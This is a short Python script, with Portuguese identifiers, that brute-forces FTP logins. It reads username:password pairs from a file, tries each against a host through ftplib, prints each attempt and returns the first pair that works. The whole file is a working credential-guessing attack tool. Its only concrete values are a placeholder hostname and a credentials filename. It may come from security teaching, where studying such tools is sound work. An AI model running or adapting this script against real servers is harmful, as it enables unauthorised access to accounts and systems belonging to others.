import ftplib

def login_forca_bruta(hostname, passwordFile):
    passList = open(passwordFile, 'r')
    for linha in passList.readlines():
        userName = linha.split(':')[0]
        passWord = linha.split(':')[1].strip('\r').strip('\n')
        print("[+] Verificando... " + str(userName) + "/" + str(passWord))
        try:
            ftp = ftplib.FTP(hostname)
            ftp.login(userName, passWord)
            print("FTP Login feito com sucesso: " + str(userName) + "/" + str(passWord))
            ftp.quit()
            return(userName, passWord)
        except Exception:
            pass

if __name__ == '__main__':
    hostname = "123"
    passwordFile = 'credentials.txt'
    login_forca_bruta(hostname, passwordFile)